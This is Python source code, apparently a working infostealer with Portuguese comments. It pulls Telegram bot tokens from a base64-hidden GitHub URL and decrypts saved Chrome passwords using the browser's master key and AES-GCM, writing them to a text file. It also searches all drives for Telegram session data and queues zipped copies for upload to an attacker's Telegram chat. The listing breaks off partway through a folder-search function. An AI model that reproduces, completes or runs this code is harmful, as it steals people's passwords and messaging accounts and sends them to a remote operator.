try:
    from telebot import TeleBot
    import glob
    import shutil
    import json
    from base64 import b64decode
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    import os
    import sqlite3
    import win32api
    import zipfile
    from zipfile import ZipFile
    import threading
    import time
    from concurrent.futures import ThreadPoolExecutor
    ZIP_DEFLATED = zipfile.ZIP_DEFLATED
    ZIP_STORED = zipfile.ZIP_STORED
    # Telethon para gerar session
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        TELETHON_AVAILABLE = True
    except ImportError:
        TELETHON_AVAILABLE = False
        print("***AVISO: Telethon não disponível, usando método alternativo")
except Exception as e:
    print("ERROR importing: " + repr(e))
    try:
        import zipfile
        from zipfile import ZipFile
        ZIP_DEFLATED = zipfile.ZIP_DEFLATED
        ZIP_STORED = zipfile.ZIP_STORED
    except:
        from zipfile import ZipFile
        ZIP_DEFLATED = 8  # Valor padrão se não conseguir importar
        ZIP_STORED = 0  # Sem compressão
    # Garante que módulos essenciais sejam importados mesmo em caso de erro
    try:
        import time
    except:
        pass
    try:
        import os
    except:
        pass
    try:
        import threading
    except:
        pass
    TELETHON_AVAILABLE = False
    pass


log_out = 0  # 1 - is on, 0 - is off


# Chat ID Central (será sobrescrito se vier do arquivo de tokens)
chat_id_central = 7711866572

# Lista de tokens disponíveis (será preenchida dinamicamente)
tokens_disponiveis = []
user_id = chat_id_central  # Compatibilidade com código existente

# URL do GitHub ofuscada (base64) - Configure sua URL aqui
# Para gerar: import base64; base64.b64encode(b'https://raw.githubusercontent.com/seuuser/seurepo/main/token.txt').decode()
# O arquivo deve ter o formato:
# 1ª linha: CHATIDCENTRAL:ID_DO_CHAT ou apenas ID_DO_CHAT
# Linhas seguintes: token/userid ou apenas token (usa chat central se não especificado)
token_github_url_encoded = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RyYWxhcmlzc2EvdHMvbWFpbi90b2tlbi50eHQ='  # URL do GitHub configurada
# Exemplo: token_github_url_encoded = 'aHR0cHM6Ly9yYXcuZ2l0aHVi...' 

# Token local (fallback se GitHub não estiver disponível) - formato: token/userid ou apenas token
token_local = ''

# URL do código Python a ser executado do GitHub (base64) - OPCIONAL
# Para gerar: import base64; base64.b64encode(b'https://raw.githubusercontent.com/seuuser/seurepo/main/codigo.py').decode()
codigo_github_url_encoded = ''  # Coloque aqui sua URL codificada em base64 (deixe vazio para desabilitar)
# Exemplo: codigo_github_url_encoded = 'aHR0cHM6Ly9yYXcuZ2l0aHVi...'

def decodificar_url_github():
    """
    Decodifica URL do GitHub de forma ofuscada.
    Converte URL de blob para raw se necessário.
    """
    global token_github_url_encoded
    
    if not token_github_url_encoded:
        return None
    
    try:
        # Decodifica base64
        from base64 import b64decode
        url_decodificada = b64decode(token_github_url_encoded).decode('utf-8')
        
        # Converte URL de blob para raw se necessário
        # Exemplo: https://github.com/user/repo/blob/main/file.txt
        # Para: https://raw.githubusercontent.com/user/repo/main/file.txt
        if 'github.com' in url_decodificada and '/blob/' in url_decodificada:
            # Extrai user/repo e o caminho do arquivo
            import re
            # Padrão: https://github.com/user/repo/blob/branch/path/file.txt
            match = re.search(r'github\.com/([^/]+)/([^/]+)/blob/([^/]+)/(.+)', url_decodificada)
            if match:
                user, repo, branch, file_path = match.groups()
                url_decodificada = f'https://raw.githubusercontent.com/{user}/{repo}/{branch}/{file_path}'
                print(f"***URL convertida para raw: {url_decodificada[:50]}...")
        
        return url_decodificada
    except:
        # Se falhar, tenta como string direta (para compatibilidade)
        try:
            return token_github_url_encoded
        except:
            return None

def analisar_conteudo_tokens(conteudo):
    """
    Analisa o conteúdo do arquivo de tokens.
    Formato esperado:
    - 1ª linha: CHATIDCENTRAL:ID_DO_CHAT ou apenas ID_DO_CHAT
    - Linhas seguintes: token/userid ou apenas token
    - Se token não tiver user_id específico, usa o chat_id central
    """
    global chat_id_central, tokens_disponiveis, user_id

    linhas = [linha.strip() for linha in conteudo.split('\n') if linha.strip() and not linha.strip().startswith('#')]

    tokens_disponiveis_temp = []

    # Processa a primeira linha - CHAT ID CENTRAL
    if linhas:
        primeira_linha = linhas[0].strip()

        # Verifica se tem formato "CHATIDCENTRAL:ID" ou apenas "ID"
        if ':' in primeira_linha:
            partes = primeira_linha.split(':', 1)
            if len(partes) == 2 and partes[0].strip().upper() == 'CHATIDCENTRAL':
                try:
                    chat_id_central = int(partes[1].strip())
                    print(f"***Chat ID Central definido: {chat_id_central}")
                except:
                    print(f"***ERRO: Chat ID Central inválido na primeira linha: {primeira_linha}")
                    return []
            else:
                # Tenta interpretar como apenas o ID
                try:
                    chat_id_central = int(primeira_linha)
                    print(f"***Chat ID Central definido (formato simples): {chat_id_central}")
                except:
                    print(f"***ERRO: Primeira linha deve conter Chat ID Central válido: {primeira_linha}")
                    return []
        else:
            # Tenta interpretar como apenas o ID
            try:
                chat_id_central = int(primeira_linha)
                print(f"***Chat ID Central definido (formato simples): {chat_id_central}")
            except:
                print(f"***ERRO: Primeira linha deve conter Chat ID Central válido: {primeira_linha}")
                return []

    # Processa as linhas restantes (tokens)
    for i, linha in enumerate(linhas[1:], 1):  # Começa do índice 1
        linha = linha.strip()
        if not linha:
            continue

        # Verifica se tem formato token/userid
        if '/' in linha:
            partes = linha.split('/', 1)  # Divide apenas na primeira '/'
            if len(partes) == 2:
                token = partes[0].strip()
                userid_str = partes[1].strip()

                # Adiciona token com seu user_id específico
                if token and userid_str and userid_str.isdigit():
                    try:
                        user_id_especifico = int(userid_str)
                        tokens_disponiveis_temp.append({
                            'token': token,
                            'user_id': user_id_especifico,
                            'linha': i + 1,
                            'usa_chat_central': False
                        })
                        print(f"***Token {i} configurado: {token[:20]}... -> user_id específico: {user_id_especifico}")
                    except:
                        # Se user_id inválido, usa o chat_id central
                        tokens_disponiveis_temp.append({
                            'token': token,
                            'user_id': chat_id_central,
                            'linha': i + 1,
                            'usa_chat_central': True
                        })
                        print(f"***Token {i} configurado: {token[:20]}... -> usa chat central (user_id inválido)")
                else:
                    # Token sem user_id válido - usa chat central
                    tokens_disponiveis_temp.append({
                        'token': token,
                        'user_id': chat_id_central,
                        'linha': i + 1,
                        'usa_chat_central': True
                    })
                    print(f"***Token {i} configurado: {token[:20]}... -> usa chat central")
            else:
                # Formato inválido, trata como apenas token - usa chat central
                tokens_disponiveis_temp.append({
                    'token': linha,
                    'user_id': chat_id_central,
                    'linha': i + 1,
                    'usa_chat_central': True
                })
                print(f"***Token {i} configurado (formato simples): {linha[:20]}... -> usa chat central")
        else:
            # Apenas token - usa chat central
            tokens_disponiveis_temp.append({
                'token': linha,
                'user_id': chat_id_central,
                'linha': i + 1,
                'usa_chat_central': True
            })
            print(f"***Token {i} configurado (apenas token): {linha[:20]}... -> usa chat central")

    tokens_disponiveis[:] = tokens_disponiveis_temp

    # Atualiza user_id global para compatibilidade - usa chat central
    user_id = chat_id_central

    print(f"***Total de tokens configurados: {len(tokens_disponiveis)}")
    print(f"***Chat ID Central: {chat_id_central}")

    # Conta quantos usam chat central vs user_ids específicos
    usam_chat_central = sum(1 for t in tokens_disponiveis if t['usa_chat_central'])
    usam_user_especifico = len(tokens_disponiveis) - usam_chat_central
    print(f"***Tokens usando chat central: {usam_chat_central}")
    print(f"***Tokens com user_id específico: {usam_user_especifico}")

    return tokens_disponiveis

def obter_token_disponivel():
    """
    Obtém um token disponível para envio, permitindo uso alternado entre múltiplas sessões.
    """
    global tokens_disponiveis

    if not tokens_disponiveis:
        # Fallback para obter_token() padrão
        return obter_token()

    # Retorna sempre o primeiro token válido (mais simples e confiável)
    # Em futuras versões pode implementar round-robin ou balanceamento
    for token_info in tokens_disponiveis:
        if validar_token(token_info['token']):
            return token_info['token'], token_info['user_id']

    # Fallback se nenhum token válido
    return obter_token(), user_id

def validar_token(token_str):
    """Valida se o token tem o formato correto (número:hash)."""
    if not token_str or not isinstance(token_str, str):
        return False
    if ':' not in token_str:
        return False
    parts = token_str.split(':')
    if len(parts) != 2:
        return False
    try:
        int(parts[0])  # Primeira parte deve ser número
        if parts[0] and parts[1] and len(token_str) > 20:
            return True
    except ValueError:
        pass
    return False

def obter_token():
    """
    Obtém token do bot Telegram, com suporte a múltiplos tokens.
    Formato esperado no arquivo token.txt: uma linha por token no formato 'token/userid' ou apenas 'token'
    """
    global token_local, user_id, tokens_disponiveis

    # Se já temos tokens carregados, retorna o primeiro válido
    if tokens_disponiveis:
        for token_info in tokens_disponiveis:
            if validar_token(token_info['token']):
                # Atualiza user_id se necessário
                if token_info['user_id']:
                    user_id = token_info['user_id']
                print(f"***Usando token configurado (linha {token_info['linha']}): {token_info['token'][:20]}...")
                return token_info['token']

    # Valida token local primeiro (formato legado)
    if token_local and validar_token(token_local):
        print(f"***Usando token local (válido)")
        return token_local
    
    # Decodifica URL do GitHub (ofuscada)
    token_github_url = decodificar_url_github()
    
    # Se não tem URL configurada, verifica token local novamente
    if not token_github_url:
        if token_local and validar_token(token_local):
            return token_local
        else:
            print(f"***ERRO: Token local inválido ou vazio. Configure um token válido.")
            raise ValueError("Token inválido: token deve estar no formato 'número:hash' (ex: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz)")
    
    try:
        try:
            import urllib.request
            import urllib.error
        except ImportError:
            # Se urllib não estiver disponível, usa token local
            print(f"***AVISO: urllib não disponível, usando token local")
            return token_local
        
        # Busca token do GitHub (não mostra URL completa no log)
        print(f"***Buscando token do GitHub...")
        
        # Cria request com timeout
        req = urllib.request.Request(token_github_url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        
        with urllib.request.urlopen(req, timeout=10) as response:
            content = response.read().decode('utf-8').strip()
            
            # Detecta se recebeu HTML em vez do arquivo raw
            if content.strip().startswith('<!DOCTYPE') or content.strip().startswith('<html') or '<!DOCTYPE html>' in content[:100]:
                print(f"***AVISO: Recebido HTML em vez do arquivo. Tentando extrair conteúdo...")
                # Tenta extrair o conteúdo do arquivo do HTML
                import re
                # Procura por padrões comuns de exibição de arquivo no GitHub
                # Procura por <pre> ou <code> com o conteúdo
                pre_match = re.search(r'<pre[^>]*>(.*?)</pre>', content, re.DOTALL | re.IGNORECASE)
                if pre_match:
                    content = pre_match.group(1).strip()
                    # Remove tags HTML se houver
                    content = re.sub(r'<[^>]+>', '', content)
                    print(f"***OK Conteúdo extraído do HTML")
                else:
                    # Tenta encontrar o conteúdo em outras tags
                    code_match = re.search(r'<code[^>]*>(.*?)</code>', content, re.DOTALL | re.IGNORECASE)
                    if code_match:
                        content = code_match.group(1).strip()
                        content = re.sub(r'<[^>]+>', '', content)
                        print(f"***OK Conteúdo extraído do HTML")
                    else:
                        # Tenta encontrar o token diretamente no HTML usando regex
                        token_pattern = r'\b(\d{8,}:[A-Za-z0-9_-]{35,}/\d{8,})\b'
                        html_token_match = re.search(token_pattern, content)
                        if html_token_match:
                            content = html_token_match.group(1)
                            print(f"***OK Token encontrado no HTML")
                        else:
                            print(f"***ERRO: Não foi possível extrair conteúdo do HTML")
                            print(f"***AVISO: A URL pode estar apontando para a página HTML em vez do arquivo raw")
                            print(f"***Sugestão: Use a URL raw: https://raw.githubusercontent.com/user/repo/branch/token.txt")
                            if token_local and validar_token(token_local):
                                return token_local
                            raise ValueError("Não foi possível extrair token do HTML. Verifique se a URL está correta (deve ser raw.githubusercontent.com)")
            
            # Processa múltiplos tokens usando a nova função
            tokens_analisados = analisar_conteudo_tokens(content)

            # Tenta encontrar um token válido
            for token_info in tokens_analisados:
                if validar_token(token_info['token']):
                    # Atualiza user_id se necessário
                    if token_info['user_id']:
                        user_id = token_info['user_id']
                    print(f"***OK Token obtido do GitHub com sucesso (linha {token_info['linha']})")
                    return token_info['token']

            # Se nenhum token válido foi encontrado
            print(f"***ERRO: Nenhum token válido encontrado no arquivo do GitHub")
            if token_local and validar_token(token_local):
                return token_local
            raise ValueError("Token inválido do GitHub e token local também inválido")
                
    except ValueError as ve:
        # Re-lança ValueError para que seja tratado acima
        raise
    except Exception as e:
        error_msg = str(e)[:100] if str(e) else repr(e)
        print(f"***AVISO: Erro ao buscar token do GitHub ({error_msg})")
        if token_local and validar_token(token_local):
            print(f"***Usando token local como fallback")
            return token_local
        raise ValueError(f"Erro ao buscar token do GitHub ({error_msg}) e token local também inválido")

# Obtém token (GitHub ou local)
token = obter_token()
name_ur_txt = 'pass.txt'

# Sistema de fila GLOBAL para múltiplas instâncias do script
import threading
import queue

# Fila global para envios (dentro do processo)
fila_envios = queue.Queue()
lock_envio = threading.Lock()
enviando = False

# Fila persistente para armazenar envios pendentes (não perde dados)
fila_persistente_path = None
lock_fila_persistente = threading.Lock()

def inicializar_fila_persistente():
    """Inicializa o arquivo de fila persistente."""
    global fila_persistente_path, temp
    if fila_persistente_path is None:
        fila_persistente_path = os.path.join(temp, 'telegram_fila_pendente.json')
        try:
            criar_diretorio_seguro(os.path.dirname(fila_persistente_path))
        except:
            pass

def adicionar_a_fila_persistente(zip_path, conjunto_num, telegram_dir=None, session_name=None, zip_size_mb=0, tipo="session_zip"):
    """Adiciona um envio à fila persistente."""
    inicializar_fila_persistente()
    
    with lock_fila_persistente:
        # Lê fila existente
        fila_existente = []
        if os.path.exists(fila_persistente_path):
            try:
                with open(fila_persistente_path, 'r', encoding='utf-8') as f:
                    fila_existente = json.load(f)
            except:
                fila_existente = []
        
        # Adiciona novo item
        item = {
            'zip_path': zip_path,
            'conjunto_num': conjunto_num,
            'telegram_dir': telegram_dir,
            'session_name': session_name,
            'zip_size_mb': zip_size_mb,
            'tipo': tipo,
            'timestamp': time.time()
        }
        
        # Verifica se já existe (evita duplicatas)
        ja_existe = False
        for item_existente in fila_existente:
            if (item_existente.get('zip_path') == zip_path and 
                item_existente.get('conjunto_num') == conjunto_num):
                ja_existe = True
                break
        
        if not ja_existe:
            fila_existente.append(item)
            
            # Salva fila
            try:
                with open(fila_persistente_path, 'w', encoding='utf-8') as f:
                    json.dump(fila_existente, f, indent=2)
                print(f"***Arquivo adicionado à fila persistente: {os.path.basename(zip_path)}")
                print(f"***Total na fila: {len(fila_existente)} arquivo(s) pendente(s)")
            except Exception as e:
                print(f"***ERRO ao salvar fila persistente: {repr(e)}")

def processar_fila_persistente():
    """Processa a fila persistente quando conseguir lock."""
    inicializar_fila_persistente()
    
    if not os.path.exists(fila_persistente_path):
        return
    
    with lock_fila_persistente:
        # Lê fila
        fila_existente = []
        try:
            with open(fila_persistente_path, 'r', encoding='utf-8') as f:
                fila_existente = json.load(f)
        except:
            return
        
        if not fila_existente:
            return
        
        print(f"***Processando fila persistente: {len(fila_existente)} arquivo(s) pendente(s)...")
        
        # Processa cada item
        itens_processados = []
        itens_nao_processados = []
        
        for item in fila_existente:
            zip_path = item.get('zip_path')
            conjunto_num = item.get('conjunto_num')
            telegram_dir = item.get('telegram_dir')
            session_name = item.get('session_name')
            zip_size_mb = item.get('zip_size_mb', 0)
            tipo = item.get('tipo', 'session_zip')
            
            # Verifica se arquivo ainda existe
            if not zip_path or not os.path.exists(zip_path):
                print(f"***AVISO: Arquivo não encontrado na fila persistente: {zip_path}")
                itens_processados.append(item)  # Remove da fila mesmo que não exista
                continue
            
            # Tenta enviar (sem tentar lock novamente, já estamos processando a fila)
            try:
                print(f"***Enviando da fila persistente: {os.path.basename(zip_path)}")
                # Chama sem tentar lock (tentar_lock=False) porque já estamos na fila
                enviar_zip_session(zip_path, conjunto_num, telegram_dir, session_name, zip_size_mb, tentar_lock=False)
                itens_processados.append(item)
                print(f"***OK Arquivo da fila persistente enviado com sucesso")
                
                # Delay saudável entre envios (3 segundos)
                time.sleep(3)
                
            except Exception as e:
                print(f"***ERRO ao enviar da fila persistente: {repr(e)}")
                import traceback
                traceback.print_exc()
                # Mantém na fila para tentar depois
                itens_nao_processados.append(item)
        
        # Atualiza fila (remove processados)
        if itens_processados:
            print(f"***{len(itens_processados)} arquivo(s) processado(s) da fila persistente")
        
        # Salva fila atualizada
        try:
            with open(fila_persistente_path, 'w', encoding='utf-8') as f:
                json.dump(itens_nao_processados, f, indent=2)
        except Exception as e:
            print(f"***ERRO ao atualizar fila persistente: {repr(e)}")

# Lock de arquivo para coordenar entre múltiplas instâncias (processos diferentes)
lock_file_path = None
lock_file = None

def inicializar_lock_global():
    """Inicializa o arquivo de lock global."""
    global lock_file_path, lock_file, temp
    if lock_file_path is None:
        lock_file_path = os.path.join(temp, 'telegram_upload.lock')
        try:
            criar_diretorio_seguro(os.path.dirname(lock_file_path))
        except:
            pass

def obter_lock_global():
    """Obtém lock global para coordenar entre múltiplas instâncias."""
    global lock_file
    import time
    inicializar_lock_global()
    
    try:
        # Verifica se há lock órfão (arquivo muito antigo) - MAIS AGRESSIVO
        if os.path.exists(lock_file_path):
            try:
                # Se o arquivo de lock tem mais de 30 segundos, considera órfão (muito agressivo)
                file_age = time.time() - os.path.getmtime(lock_file_path)
                if file_age > 30:  # 30 segundos apenas
                    print(f"***AVISO: Lock órfão detectado (idade: {file_age:.0f}s), removendo...")
                    try:
                        # Tenta remover o arquivo de lock órfão
                        if os.name == 'nt':
                            import msvcrt
                            try:
                                temp_file = open(lock_file_path, 'r+')
                                try:
                                    msvcrt.locking(temp_file.fileno(), msvcrt.LK_UNLCK, 1)
                                except:
                                    pass
                                temp_file.close()
                            except:
                                pass
                        os.remove(lock_file_path)
                        print(f"***OK Lock órfão removido")
                    except Exception as e:
                        print(f"***AVISO: Não foi possível remover lock órfão, forçando...")
                        # Força remoção mesmo com erro
                        try:
                            os.remove(lock_file_path)
                        except:
                            pass
            except:
                pass
        
        # Fecha arquivo anterior se existir
        if lock_file:
            try:
                lock_file.close()
            except:
                pass
            lock_file = None
        
        # Abre novo arquivo
        lock_file = open(lock_file_path, 'a+')
        
        # Tenta obter lock exclusivo (não bloqueia - retorna False se não conseguir)
        if os.name == 'nt':  # Windows
            import msvcrt
            try:
                msvcrt.locking(lock_file.fileno(), msvcrt.LK_NBLCK, 1)
                # Escreve timestamp no arquivo para detectar locks órfãos
                lock_file.seek(0)
                lock_file.truncate()
                lock_file.write(str(time.time()))
                lock_file.flush()
                return True
            except IOError:
                # Lock já está em uso - verifica se é órfão (mais agressivo)
                try:
                    lock_file.seek(0)
                    timestamp_str = lock_file.read().strip()
                    if timestamp_str:
                        try:
                            timestamp = float(timestamp_str)
                            age = time.time() - timestamp
                            if age > 30:  # Mais de 30 segundos = órfão (muito agressivo)
                                print(f"***AVISO: Lock órfão detectado (idade: {age:.0f}s), forçando liberação...")
                                try:
                                    msvcrt.locking(lock_file.fileno(), msvcrt.LK_UNLCK, 1)
                                    # Tenta obter novamente
                                    msvcrt.locking(lock_file.fileno(), msvcrt.LK_NBLCK, 1)
                                    lock_file.seek(0)
                                    lock_file.truncate()
                                    lock_file.write(str(time.time()))
                                    lock_file.flush()
                                    return True
                                except:
                                    # Se não conseguir, força remoção do arquivo
                                    lock_file.close()
                                    lock_file = None
                                    try:
                                        os.remove(lock_file_path)
                                    except:
                                        pass
                                    return False
                        except ValueError:
                            # Timestamp inválido, considera órfão
                            print(f"***AVISO: Lock com timestamp inválido, removendo...")
                            lock_file.close()
                            lock_file = None
                            try:
                                os.remove(lock_file_path)
                            except:
                                pass
                            return False
                    else:
                        # Arquivo vazio, pode ser órfão
                        return False
                except:
                    return False
        else:  # Linux/Mac
            import fcntl
            try:
                fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
                # Escreve timestamp
                lock_file.seek(0)
                lock_file.truncate()
                lock_file.write(str(time.time()))
                lock_file.flush()
                return True
            except (IOError, OSError):
                # Lock já está em uso
                return False
    except Exception as e:
        # Se não conseguir lock, assume que pode continuar (fallback)
        print(f"***AVISO: Erro ao obter lock ({str(e)[:50]}), continuando sem lock...")
        return True

def liberar_lock_global():
    """Libera lock global."""
    global lock_file
    try:
        if lock_file:
            if os.name == 'nt':  # Windows
                import msvcrt
                msvcrt.locking(lock_file.fileno(), msvcrt.LK_UNLCK, 1)
            else:  # Linux/Mac
                import fcntl
                fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)
    except:
        pass

# Verifica se TeleBot foi importado corretamente
try:
    TeleBot
except NameError:
    # Se TeleBot não foi importado, tenta importar novamente
    try:
        from telebot import TeleBot
    except ImportError as e:
        print(f"***ERRO CRÍTICO: Não foi possível importar TeleBot: {repr(e)}")
        print("***Por favor, instale o pyTelegramBotAPI: pip install pyTelegramBotAPI")
        raise

# Valida token antes de criar o bot
if not token or not validar_token(token):
    print(f"***ERRO CRÍTICO: Token inválido!")
    print(f"***O token deve estar no formato: 'número:hash' (ex: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz)")
    print(f"***Token atual: '{token[:20]}...' (primeiros 20 caracteres)" if token and len(token) > 20 else f"***Token atual: '{token}'")
    print(f"***Por favor, configure um token válido no arquivo token.txt do GitHub ou na variável token_local")
    raise ValueError("Token inválido: deve estar no formato 'número:hash'")

try:
    bot = TeleBot(token)
    print(f"***OK Bot inicializado com sucesso")
except ValueError as e:
    if 'colon' in str(e).lower() or ':' in str(e):
        print(f"***ERRO CRÍTICO: Token inválido - não contém dois pontos (:)")
        print(f"***O token deve estar no formato: 'número:hash'")
        print(f"***Token recebido: '{token[:50]}...' (primeiros 50 caracteres)" if token and len(token) > 50 else f"***Token recebido: '{token}'")
        print(f"***Por favor, verifique o arquivo token.txt no GitHub ou configure token_local corretamente")
    raise
except Exception as e:
    print(f"***ERRO CRÍTICO ao inicializar bot: {repr(e)}")
    raise

def processar_fila_envios():
    """Processa a fila de envios sequencialmente, coordenando com outras instâncias."""
    global enviando
    while True:
        try:
            # Tenta obter lock global antes de processar
            if not obter_lock_global():
                # Outra instância está enviando, espera um pouco
                time.sleep(2)
                continue
            
            try:
                # Pega próximo item da fila (não bloqueia muito tempo)
                try:
                    item = fila_envios.get(timeout=1)
                except queue.Empty:
                    liberar_lock_global()
                    continue
                
                if item is None:  # Sinal para parar
                    break
                
                funcao_envio, args, kwargs = item
                
                with lock_envio:
                    enviando = True
                
                try:
                    # Executa o envio
                    funcao_envio(*args, **kwargs)
                except Exception as e:
                    print(f"ERROR na fila de envios: {repr(e)}")
                finally:
                    with lock_envio:
                        enviando = False
                    fila_envios.task_done()
            finally:
                liberar_lock_global()
                
        except queue.Empty:
            continue
        except Exception as e:
            print(f"ERROR no processador de fila: {repr(e)}")
            time.sleep(1)

# Define variáveis de diretório ANTES de iniciar threads
pathusr = os.path.expanduser('~')
local = os.getenv("LOCALAPPDATA")

# Tenta obter diretório Temp com tratamento de erro
temp = None
try:
    temp_default = os.path.join(local, "Temp") if local else None
    if temp_default:
        # Testa se consegue criar arquivo no diretório
        try:
            test_file = os.path.join(temp_default, "test_write_permission.tmp")
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            temp = temp_default
        except (PermissionError, OSError):
            # Se não tiver permissão, tenta usar diretório alternativo
            try:
                temp_alt = os.path.join(pathusr, "AppData", "Local", "Temp")
                if os.path.exists(temp_alt):
                    test_file = os.path.join(temp_alt, "test_write_permission.tmp")
                    with open(test_file, 'w') as f:
                        f.write("test")
                    os.remove(test_file)
                    temp = temp_alt
                else:
                    # Última tentativa: usa diretório do script
                    temp = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else pathusr
            except:
                # Fallback: usa diretório do usuário
                temp = pathusr
    else:
                    temp = pathusr
except:
    # Fallback final: usa diretório do usuário
    temp = pathusr

ttemp = os.path.join(temp, "tdata")
#desktop = os.path.join(pathusr, "Desktop\\tdata\\")

# Inicia thread para processar fila (DEPOIS de definir temp)
thread_fila = threading.Thread(target=processar_fila_envios, daemon=True)
thread_fila.start()

# Detecta TODOS os drives disponíveis dinamicamente
def obter_todos_drives():
    """Obtém todos os drives disponíveis no sistema."""
    drives = []
    try:
        import string
        # Tenta detectar usando os.path (mais confiável)
        for drive_letter in string.ascii_uppercase:
            drive_path = f"{drive_letter}:\\"
            try:
                if os.path.exists(drive_path):
                    # Tenta acessar para verificar se é válido
                    try:
                        os.listdir(drive_path)
                        drives.append(drive_path)
                    except (PermissionError, OSError):
                        # Drive existe mas não é acessível, adiciona mesmo assim (pode ser CD/DVD)
                        drives.append(drive_path)
                    except:
                        # Outro erro, adiciona mesmo assim
                        drives.append(drive_path)
            except:
                pass
    except:
        # Fallback: tenta detectar usando os.path
        for drive_letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            drive_path = f"{drive_letter}:\\"
            if os.path.exists(drive_path):
                drives.append(drive_path)
    
    # Se não encontrou nenhum, usa lista padrão expandida (A: até Z:)
    if not drives:
        drives = [f"{chr(65+i)}:\\" for i in range(26)]
    
    print(f"***Drives detectados: {len(drives)} ({', '.join(drives)})")
    return drives

paths = obter_todos_drives()
path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')

# Lista de arquivos temporários criados (para limpeza automática)
arquivos_temp_criados = []
lock_arquivos_temp = threading.Lock()

def criar_diretorio_seguro(caminho):
    """Cria um diretório com tratamento de erro de permissão."""
    try:
        os.makedirs(caminho, exist_ok=True)
        return True
    except (PermissionError, OSError) as e:
        # Se não tiver permissão, tenta criar em local alternativo
        try:
            # Tenta criar no diretório do usuário como fallback
            alt_path = os.path.join(pathusr, os.path.basename(caminho))
            os.makedirs(alt_path, exist_ok=True)
            print(f"***AVISO: Sem permissão em {caminho}, usando {alt_path}")
            return True
        except:
            print(f"***ERRO: Não foi possível criar diretório {caminho}: {repr(e)}")
            return False

def limpar_arquivos_temp():
    """Remove todos os arquivos temporários criados pelo script."""
    global arquivos_temp_criados
    with lock_arquivos_temp:
        removidos = 0
        for arquivo_temp in arquivos_temp_criados[:]:  # Cópia da lista
            try:
                if os.path.exists(arquivo_temp):
                    if os.path.isdir(arquivo_temp):
                        shutil.rmtree(arquivo_temp)
                    else:
                        os.remove(arquivo_temp)
                    removidos += 1
                arquivos_temp_criados.remove(arquivo_temp)
            except Exception as e:
                # Se não conseguir remover, tenta depois
                pass
        
        # Limpa arquivos antigos do script em temp (mais de 1 hora)
        try:
            if temp and os.path.exists(temp) and os.path.isdir(temp):
                agora = time.time()
                try:
                    items = os.listdir(temp)
                except (PermissionError, OSError) as e:
                    # Se não tiver permissão para listar, ignora silenciosamente
                    items = []
                
                for item in items:
                    item_path = os.path.join(temp, item)
                    try:
                        # Verifica se é arquivo temporário do script
                        if (item.startswith('session_conjunto_') or 
                            item.startswith('tdata_clone_') or 
                            item.startswith('conjunto_') or
                            item.endswith('_parte_') or
                            item.startswith('tdata_conjunto_') and item.endswith('.zip')):
                            # Verifica idade do arquivo
                            if os.path.exists(item_path):
                                try:
                                    idade = agora - os.path.getmtime(item_path)
                                    if idade > 3600:  # Mais de 1 hora
                                        if os.path.isdir(item_path):
                                            shutil.rmtree(item_path)
                                        else:
                                            os.remove(item_path)
                                        removidos += 1
                                except (PermissionError, OSError):
                                    # Se não tiver permissão, ignora este arquivo
                                    pass
                    except (PermissionError, OSError):
                        # Se não tiver permissão, ignora este item
                        pass
        except Exception as e:
            # Ignora erros de permissão ao limpar arquivos temporários
            pass
        
        if removidos > 0:
            print(f"***Limpeza: {removidos} arquivo(s) temporário(s) removido(s)")

def registrar_arquivo_temp(arquivo_path):
    """Registra um arquivo temporário para limpeza automática."""
    global arquivos_temp_criados
    with lock_arquivos_temp:
        if arquivo_path not in arquivos_temp_criados:
            arquivos_temp_criados.append(arquivo_path)

def remover_arquivo_temp(arquivo_path):
    """Remove um arquivo temporário específico."""
    global arquivos_temp_criados
    try:
        if os.path.exists(arquivo_path):
            if os.path.isdir(arquivo_path):
                shutil.rmtree(arquivo_path)
            else:
                # Remove também arquivos relacionados (WAL, SHM para SQLite)
                if arquivo_path.endswith('.session'):
                    try:
                        os.remove(arquivo_path + '-wal')
                    except:
                        pass
                    try:
                        os.remove(arquivo_path + '-shm')
                    except:
                        pass
                os.remove(arquivo_path)
        with lock_arquivos_temp:
            if arquivo_path in arquivos_temp_criados:
                arquivos_temp_criados.remove(arquivo_path)
        return True
    except Exception as e:
        return False


def getmasterkey():
    try:
        with open(path, encoding="utf-8") as f:
            load = json.load(f)["os_crypt"]["encrypted_key"]
            master_key = b64decode(load)
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        print("ERROR: couldn't access the masterkey")
        pass


def decryption(buff, key):
    try:
        payload = buff[15:]
        iv = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print("ERROR in decryption: " + repr(e))


def Chrome():
    text = 'YOUR PASSWORDS\n'
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                            os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                password = result[2]
                login = result[1]
                url = result[0]
                decrypted_pass = decryption(password, getmasterkey())
                text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
                with open(name_ur_txt, "w", encoding="utf-8") as f:
                    f.write(text)
    except Exception as e:
        print("ERROR in Chrome() func: " + repr(e))
        pass


def finddir(path):
    for root, dirs, files in os.walk(path):
        for name in dirs:
            if name == "*":
                found = os.path.join(root, name)
                print("***Checking folder: " + found)
                if os.path.exists(found + '*\\Telegram.exe'):
